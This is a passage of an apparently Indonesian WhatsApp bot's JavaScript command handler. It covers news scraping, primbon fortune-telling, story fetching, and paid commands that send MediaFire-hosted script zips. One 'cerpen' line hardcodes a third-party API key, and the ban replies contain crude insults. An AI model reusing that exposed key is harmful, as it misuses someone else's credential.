teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'detik':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'daily':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'inews':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'sindo':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'antara':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "kontan":
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "merdeka":
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
kyy.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "jalantikus":
await loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
kyy.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//=================================================
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA Hw`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================
case 'cerpen':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=06e2ad993927b9c0779dfd31`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
//=================================================
case 'ceritahoror':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
kyy.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
//=================================================
                case 'buysc1': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/cku38uri67q16ov/Free1.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc2': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/zm56k87hqst54cq/Free2.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc3': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/f4a7sxq6lmdhpwd/Free3.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc4': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/n0d2o3u98q0anw9/Free4.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc5': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/g01n99speif85bj/Free5.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc6': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/m4tgdftzm9t2nji/Free6.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc7': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/x6th6u4nh8ad8wv/Scv7.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc8': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/k13jxfbeimrrtjn/Sc+Gratis+By+Rafathar.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc9': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/b4qcuinhpkmg5n8/Sc+Gratis.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc10': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/0xy68my2nju4rx0/Pw+Cari+Sendiri,+Gush+Chat+Gw.zip/file')
